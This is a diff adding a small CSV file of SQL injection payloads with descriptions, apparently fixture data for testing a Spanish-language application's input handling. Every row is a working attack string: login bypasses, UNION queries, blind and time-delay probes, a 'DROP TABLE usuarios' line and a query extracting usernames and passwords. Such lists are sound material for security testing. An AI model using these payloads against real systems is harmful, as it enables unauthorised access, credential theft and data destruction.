@@ -1,0 +1,20 @@
+payload,descripcion
+' OR '1'='1,Basic OR injection
+' OR '1'='1' --,OR with comment
+' OR '1'='1' /*,OR with block comment
+admin' --,Comment out password check
+admin' #,MySQL comment
+' UNION SELECT NULL--,Union-based injection
+1' AND 1=1 --,Boolean-based blind
+1' AND 1=2 --,Boolean-based blind (false)
+' OR 'x'='x,Alternative OR injection
+') OR ('1'='1,Parenthesis bypass
+' OR 1=1--,Numeric OR injection
+admin'--,Simple admin bypass
+' or ''=',Empty string comparison
+1' UNION SELECT NULL,NULL--,Union with multiple columns
+' AND '1'='1,AND injection
+' WAITFOR DELAY '00:00:05'--,Time-based blind (SQL Server)
+' OR SLEEP(5)--,Time-based blind (MySQL)
+'; DROP TABLE usuarios--,Destructive injection (test only!)
+' UNION SELECT username,password FROM usuarios--,Data extraction attempt
